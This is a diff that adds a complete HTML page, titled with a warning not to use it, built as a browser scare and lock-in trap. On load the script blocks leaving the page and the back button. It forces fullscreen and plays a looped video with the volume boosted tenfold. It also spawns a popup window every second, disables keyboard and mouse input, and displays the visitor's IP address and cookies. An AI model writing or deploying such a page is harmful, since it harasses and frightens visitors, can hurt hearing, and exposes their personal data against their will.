@@ -1,0 +1,129 @@
+<html>
+<head>
+    <title>WARNING: DO NOT USE THIS CODE</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            background-image: url('https://upload.wikimedia.org/wikipedia/en/8/8f/Jeff_the_Killer.jpg');
+            background-size: cover;
+        }
+        #videoContainer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 9999;
+        }
+        #ipDisplay, #cookieDisplay {
+            position: fixed;
+            top: 10px;
+            color: red;
+            font-size: 24px;
+            text-transform: uppercase;
+            text-shadow: 0 0 10px red;
+            animation: glitch 1s infinite;
+        }
+        @keyframes glitch {
+            2%, 64% { transform: translate(2px, 0) skew(0deg); }
+            4%, 60% { transform: translate(-2px, 0) skew(0deg); }
+            62% { transform: translate(0, 0) skew(5deg); }
+        }
+    </style>
+</head>
+<body>
+    <div id="videoContainer"></div>
+    <div id="ipDisplay"></div>
+    <div id="cookieDisplay"></div>
+
+    <script type="module">
+        const videoPath = '/SPOILER_VID_20200420_040019.mp4';
+
+        function preventExit() {
+            window.onbeforeunload = () => false;
+            history.pushState(null, null, location.href);
+            window.onpopstate = () => history.pushState(null, null, location.href);
+        }
+
+        function getCookie() {
+            return document.cookie;
+        }
+
+        function getIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ipDisplay').textContent = data.ip;
+                });
+        }
+
+        function setupFullscreenLock() {
+            function enterFullscreen() {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                } else if (document.documentElement.mozRequestFullScreen) {
+                    document.documentElement.mozRequestFullScreen();
+                } else if (document.documentElement.webkitRequestFullscreen) {
+                    document.documentElement.webkitRequestFullscreen();
+                }
+            }
+            setInterval(enterFullscreen, 1000);
+        }
+
+        function setupVideo() {
+            const videoContainer = document.getElementById('videoContainer');
+            const video = document.createElement('video');
+            video.src = videoPath;
+            video.autoplay = true;
+            video.loop = true;
+            video.muted = false;
+            video.volume = 1.0;
+            video.style.width = '100%';
+            video.style.height = '100%';
+            video.style.objectFit = 'cover';
+
+            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            const source = audioContext.createMediaElementSource(video);
+            const gainNode = audioContext.createGain();
+            gainNode.gain.value = 10.0;
+            source.connect(gainNode).connect(audioContext.destination);
+
+            videoContainer.appendChild(video);
+            video.play();
+        }
+
+        function spawnWindows() {
+            setInterval(() => {
+                const newWindow = window.open(window.location.href, '_blank', 
+                    `width=${Math.random() * window.screen.width},height=${Math.random() * window.screen.height}`);
+                
+                if (newWindow) {
+                    newWindow.focus();
+                }
+            }, 1000);
+        }
+
+        function lockMouseAndKeyboard() {
+            document.addEventListener('keydown', (e) => e.preventDefault(), true);
+            document.addEventListener('contextmenu', (e) => e.preventDefault(), true);
+            
+            const blockMouseMove = (e) => {
+                e.preventDefault();
+                window.scrollTo(0, 0);
+            };
+            
+            document.addEventListener('mousemove', blockMouseMove, true);
+        }
+
+        preventExit();
+        getIP();
+        setupFullscreenLock();
+        setupVideo();
+        spawnWindows();
+        lockMouseAndKeyboard();
+        
+        document.getElementById('cookieDisplay').textContent = getCookie();
+    </script>
+</body>
+</html>
